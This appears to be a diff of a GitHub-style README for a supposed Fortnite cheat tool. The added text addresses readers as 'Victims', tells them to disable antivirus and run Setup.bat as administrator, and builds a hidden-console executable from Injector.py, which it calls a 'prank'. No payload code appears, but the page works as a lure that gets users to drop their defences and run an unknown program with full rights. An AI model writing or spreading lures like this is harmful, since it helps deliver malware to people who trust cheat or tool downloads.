@@ -1,2 +1,28 @@
 # PL-Fortnite
-The best Fortnite Cheats on the market
+## 💻 System "Requirements" (Fake)
+- Windows 10/11 (64-bit)
+- "Disable antivirus" (to avoid "false positives") 😉
+- Administrator privileges
+
+## 🚀 Getting Started
+
+### Basic Method (For Victims)
+1. **Download** the latest release
+2. **Extract** the ZIP file
+3. **Right-click** `Setup.bat` > "Run as administrator"
+4. Follow the on-screen instructions (and enjoy the show!)
+
+
+## 🔧 What's Inside
+| File | Purpose |
+|------|---------|
+| `Setup.bat` | Automaticly install dependencies for you instead of manual |
+| `Injector.exe` | The executable is what helps you run / get the cheats  |
+| `README.txt` | Helps you understand what to do |
+
+## 🛠️ For Developers
+To modify the prank:
+```bash
+# Build from source (requires Python)
+pip install pyinstaller
+pyinstaller --onefile --noconsole Injector.py
